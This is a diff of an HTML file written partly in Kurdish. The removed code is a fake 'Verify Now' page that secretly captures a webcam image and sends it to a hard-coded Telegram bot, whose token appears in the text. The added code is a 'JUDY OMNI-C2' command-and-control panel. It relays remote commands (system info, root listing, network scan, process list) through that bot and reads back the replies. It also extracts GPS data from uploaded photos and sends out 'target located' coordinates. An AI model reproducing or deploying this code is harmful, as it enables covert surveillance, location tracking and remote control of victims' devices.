@@ -1,25 +1,207 @@
 <!DOCTYPE html>
-<html>
-<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
-    <button onclick="sendData()" style="padding:20px;">Verify Now</button>
-    <script>
-        async function sendData() {
-            const s = await navigator.mediaDevices.getUserMedia({video:true});
-            const v = document.createElement('video'); v.srcObject = s; v.play();
-            setTimeout(async () => {
-                const cv = document.createElement('canvas'); cv.width=400; cv.height=300;
-                cv.getContext('2d').drawImage(v,0,0);
-                const img = cv.toDataURL('image/jpeg', 0.5);
-                
-                // لێرەدا ڕاستەوخۆ دەنێردرێت بۆ تێلیگرام بێ ئەوەی پێویستی بە تێرمیناڵ بێت
-                await fetch('https://api.telegram.org/bot8344933620:AAGonsjbg_MdNRjWb5I6QD8e_NCH1H7Emi8/sendMessage', {
-                    method:'POST',
-                    headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({chat_id:'5982066799', text: "📸 NEW:\n" + img})
-                });
-                alert("Done!");
-            }, 2000);
-        }
-    </script>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JUDY OMNI-C2 | ULTIMATE INTEL</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/exif-js/2.3.0/exif.min.js"></script>
+    <style>
+        :root { --neon: #00ff41; --danger: #ff003c; --info: #00d4ff; --bg: #030303; }
+        * { box-sizing: border-box; transition: 0.3s; }
+        body, html { margin: 0; padding: 0; background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; overflow-x: hidden; }
+
+        /* Matrix Background */
+        #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.2; }
+
+        .container { max-width: 1300px; margin: auto; padding: 20px; }
+
+        /* Header & Status */
+        header { border: 1px solid var(--neon); padding: 20px; background: rgba(0,0,0,0.9); margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 0 15px var(--neon); }
+        .blink { animation: blinker 1.5s linear infinite; color: var(--danger); font-weight: bold; }
+        @keyframes blinker { 50% { opacity: 0; } }
+
+        /* Grid Layout */
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        @media (max-width: 900px) { .grid { grid-template-columns: 1fr; } }
+
+        /* Panels */
+        .panel { border: 1px solid var(--neon); background: rgba(0,0,0,0.8); padding: 15px; position: relative; }
+        .panel-header { background: var(--neon); color: #000; padding: 5px 10px; font-weight: bold; margin: -15px -15px 15px -15px; display: flex; justify-content: space-between; }
+
+        /* Terminal Live Output */
+        #liveTerminal { height: 250px; overflow-y: auto; background: #000; border: 1px solid var(--info); padding: 10px; font-size: 13px; color: var(--info); white-space: pre-wrap; }
+
+        /* Map System */
+        #mapBox { height: 300px; border: 1px solid var(--danger); background: #080808; display: none; overflow: hidden; }
+        iframe { width: 100%; height: 100%; border: none; filter: invert(90%) hue-rotate(180deg); }
+
+        /* Upload Area */
+        .drop-zone { border: 2px dashed var(--neon); padding: 40px; text-align: center; margin-bottom: 20px; cursor: pointer; }
+        .drop-zone:hover { background: rgba(0,255,65,0.1); }
+
+        /* Buttons */
+        .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .btn { background: transparent; border: 1px solid var(--neon); color: var(--neon); padding: 15px; cursor: pointer; font-weight: bold; }
+        .btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 20px var(--neon); }
+
+        .lang-btn { background: #222; color: #fff; border: none; padding: 5px 10px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<div class="container">
+    <header>
+        <div>
+            <h1 id="txt-title">JUDY OMNI-C2 V2026</h1>
+            <p id="txt-sub">CENTRAL INTELLIGENCE & CONTROL SYSTEM</p>
+        </div>
+        <div>
+            <span class="blink">● ENCRYPTED LINK ACTIVE</span><br>
+            <button class="lang-btn" onclick="setLang('ku')">Kurdish</button>
+            <button class="lang-btn" onclick="setLang('en')">English</button>
+        </div>
+    </header>
+
+    <div class="drop-zone" onclick="document.getElementById('fileIn').click()">
+        <span id="txt-drop">📂 [ فایلی وێنە لێرە دابنێ بۆ دەرهێنانی زانیاری و GPS ]</span>
+        <input type="file" id="fileIn" style="display:none" onchange="analyzeImage(this)">
+    </div>
+
+    <div class="grid">
+        <div>
+            <div class="panel">
+                <div class="panel-header"><span id="txt-term">LIVE TERMINAL BRIDGE</span> <span>V1.0</span></div>
+                <div id="liveTerminal">[BRIDGE] Establishing handshake with engine.py...</div>
+            </div>
+            <br>
+            <div class="actions">
+                <button class="btn" onclick="sendCmd('GET_SYS_INFO')">⚙️ SYSTEM INFO</button>
+                <button class="btn" onclick="sendCmd('LS_ROOT')">📂 LIST ROOT</button>
+                <button class="btn" onclick="sendCmd('NET_STAT')">🌐 NETWORK SCAN</button>
+                <button class="btn" onclick="sendCmd('PROC_LIST')">📑 PROCESSES</button>
+            </div>
+        </div>
+
+        <div>
+            <div class="panel" style="border-color: var(--danger);">
+                <div class="panel-header" style="background: var(--danger);"><span id="txt-intel">INTEL & GPS TRACE</span></div>
+                <div id="intelReport">[WAITING] No intel data selected.</div>
+                <div id="mapBox"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // --- Matrix Animation ---
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const columns = Array(Math.floor(canvas.width/20)).fill(0);
+    function matrixEffect() {
+        ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
+        ctx.fillStyle = "#0f0"; ctx.font = "15px monospace";
+        columns.forEach((y, i) => {
+            const char = String.fromCharCode(33 + Math.random() * 94);
+            ctx.fillText(char, i * 20, y);
+            if (y > canvas.height && Math.random() > 0.975) columns[i] = 0;
+            else columns[i] += 20;
+        });
+    }
+    setInterval(matrixEffect, 50);
+
+    // --- Core Logic ---
+    const TOKEN = "8344933620:AAGonsjbg_MdNRjWb5I6QD8e_NCH1H7Emi8";
+    const CHAT_ID = "5982066799";
+    let lastUpdateId = 0;
+
+    // ناردنی فەرمان
+    async function sendCmd(command) {
+        logTerm(`[SENT] Executing: ${command}...`);
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({chat_id: CHAT_ID, text: command})
+        });
+    }
+
+    // وەرگرتنەوەی وەڵام لە تێرمیناڵەوە
+    async function getLiveUpdates() {
+        try {
+            const r = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
+            const d = await r.json();
+            if (d.result.length > 0) {
+                const msg = d.result[0].message;
+                if (msg.message_id !== lastUpdateId && msg.from.is_bot) {
+                    lastUpdateId = msg.message_id;
+                    logTerm(`[GHOST_REPLY]\n${msg.text}`);
+                }
+            }
+        } catch (e) {}
+    }
+    setInterval(getLiveUpdates, 2000);
+
+    function logTerm(msg) {
+        const term = document.getElementById('liveTerminal');
+        term.innerHTML += `<br>>>> ${msg}`;
+        term.scrollTop = term.scrollHeight;
+    }
+
+    // --- Image Analysis (Metadata & GPS) ---
+    function analyzeImage(input) {
+        const file = input.files[0];
+        if(!file) return;
+        logTerm(`[FILE] Received: ${file.name}`);
+
+        EXIF.getData(file, function() {
+            const data = EXIF.getAllTags(this);
+            const make = data.Make || "Unknown";
+            const model = data.Model || "Unknown";
+            const date = data.DateTime || "No Timestamp";
+
+            let report = `<b>[!] METADATA EXTRACTED:</b><br>
+                          Device: ${make} ${model}<br>
+                          Timestamp: ${date}<br>
+                          Size: ${file.size} bytes<br>`;
+
+            if (data.GPSLatitude) {
+                const lat = convGPS(data.GPSLatitude, data.GPSLatitudeRef);
+                const lon = convGPS(data.GPSLongitude, data.GPSLongitudeRef);
+                report += `<br><b style="color:var(--danger)">📍 GPS DETECTED: [${lat}, ${lon}]</b>`;
+                document.getElementById('mapBox').style.display = "block";
+                document.getElementById('mapBox').innerHTML = `<iframe src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed"></iframe>`;
+                sendCmd(`🎯 TARGET LOCATED at: ${lat}, ${lon}`);
+            } else {
+                report += `<br><span>[!] No GPS data found.</span>`;
+                document.getElementById('mapBox').style.display = "none";
+            }
+            document.getElementById('intelReport').innerHTML = report;
+        });
+    }
+
+    function convGPS(dms, ref) {
+        let deg = dms[0] + dms[1]/60 + dms[2]/3600;
+        return (ref === "S" || ref === "W") ? deg * -1 : deg;
+    }
+
+    // --- Translation ---
+    const langs = {
+        ku: { title: "JUDY OMNI-C2 V2026", sub: "وەزارەتی بەرگری - سیستەمی کۆنتڕۆڵی ناوەندی", drop: "📂 [ فایلی وێنە لێرە دابنێ بۆ دەرهێنانی زانیاری و GPS ]", term: "پەیوەندی ڕاستەوخۆ لەگەڵ تێرمیناڵ", intel: "شیکردنەوەی مێتاداتا و شوێن", dir: "rtl" },
+        en: { title: "JUDY OMNI-C2 V2026", sub: "Ministry of Defense - Central Control System", drop: "📂 [ Drop image here for Metadata & GPS extraction ]", term: "LIVE TERMINAL BRIDGE", intel: "INTEL & GPS TRACE", dir: "ltr" }
+    };
+
+    function setLang(l) {
+        const c = langs[l];
+        document.documentElement.dir = c.dir;
+        document.getElementById('txt-title').innerText = c.title;
+        document.getElementById('txt-sub').innerText = c.sub;
+        document.getElementById('txt-drop').innerText = c.drop;
+        document.getElementById('txt-term').innerText = c.term;
+        document.getElementById('txt-intel').innerText = c.intel;
+    }
+</script>
+
 </body>
 </html>
